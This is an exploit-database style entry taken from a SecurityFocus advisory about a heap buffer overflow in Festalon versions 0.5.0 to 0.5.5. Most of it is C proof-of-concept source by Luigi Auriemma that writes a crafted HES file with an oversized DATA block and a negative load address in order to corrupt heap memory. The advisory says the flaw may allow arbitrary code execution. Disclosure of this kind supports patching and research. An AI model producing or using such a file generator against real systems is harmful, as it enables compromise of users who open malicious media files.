source: http://www.securityfocus.com/bid/19402/info

A buffer-overflow vulnerability occurs in the Festalon application because the software fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.

This issue may allow attackers to execute arbitrary machine code in the context of the affected application, which may facilitate the remote compromise of affected computers.

Festalon versions 0.5.0 through 0.5.5 are vulnerable to this issue.

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>



#define VER                 "0.1"
#define FESTALON_HES_LIMIT  0x100000
#define FESTALON_HES_SIZE   1501888
#define UNDERSIZE           32      // maximum amount of data before allocation
#define FESTALON_HES_FRONT  (0x2000 + 0x8000 + UNDERSIZE)
#define HEAPOVERSZ          (FESTALON_HES_FRONT + FESTALON_HES_LIMIT)



void fwbof(FILE *fd, int len, int chr);
void fwi08(FILE *fd, int num);
void fwi16(FILE *fd, int num);
void fwi32(FILE *fd, int num);
void fwmem(FILE *fd, uint8_t *data, int size);
void std_err(void);



int main(int argc, char *argv[]) {
    FILE    *fd;
    char    *fname;

    setbuf(stdout, NULL);

    fputs("\n"
        "Festalon 0.5.0-0.5.5 heap corruption "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <output_file.NSF>\n"
            "\n", argv[0]);
        exit(1);
    }

    fname = argv[1];

    printf("- create file %s\n", fname);
    fd = fopen(fname, "wb");
    if(!fd) std_err();

    fwmem(fd, "HESM", 4);           // MAGIC-ID 'HESM'
    fwi08(fd, 0);                   // VERSION(0)
    fwi08(fd, 0);                   // START SONG
    fwi16(fd, 0);                   // REQUEST ADDRESS(LOGICAL ADDRESS)
    fwi08(fd, 0xff);                // INITIAL MPR0($FF)
    fwi08(fd, 0xf8);                // INITIAL MPR1($F8)
    fwi08(fd, 0);                   // INITIAL MPR2
    fwi08(fd, 0);                   // INITIAL MPR3
    fwi08(fd, 0);                   // INITIAL MPR4
    fwi08(fd, 0);                   // INITIAL MPR5
    fwi08(fd, 0);                   // INITIAL MPR6
    fwi08(fd, 0x00);                // INITIAL MPR7($00)

    fwmem(fd, "DATA", 4);           // SUB-ID 'DATA'
    fwi32(fd, HEAPOVERSZ);          // DATA SIZE
    fwi32(fd, -FESTALON_HES_FRONT); // LOAD ADDRESS(PHYSICAL ADDRESS)
    fwi32(fd, 0);                   // RESERVE(0)
    fwbof(fd, HEAPOVERSZ, 'a');     // DATA

    printf(
        "- this PoC forces the program to overwrite the %d bytes before the starting\n"
        "  of the hes allocated memory\n", UNDERSIZE);

    fclose(fd);
    printf("- finished\n");
    return(0);
}



void fwbof(FILE *fd, int len, int chr) {
    while(len--) fputc(chr, fd);
}



void fwi08(FILE *fd, int num) {
    fputc((num      ) & 0xff, fd);
}



void fwi16(FILE *fd, int num) {
    fputc((num      ) & 0xff, fd);
    fputc((num >>  8) & 0xff, fd);
}



void fwi32(FILE *fd, int num) {
    fputc((num      ) & 0xff, fd);
    fputc((num >>  8) & 0xff, fd);
    fputc((num >> 16) & 0xff, fd);
    fputc((num >> 24) & 0xff, fd);
}



void fwmem(FILE *fd, uint8_t *data, int size) {
    fwrite(data, size, 1, fd);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}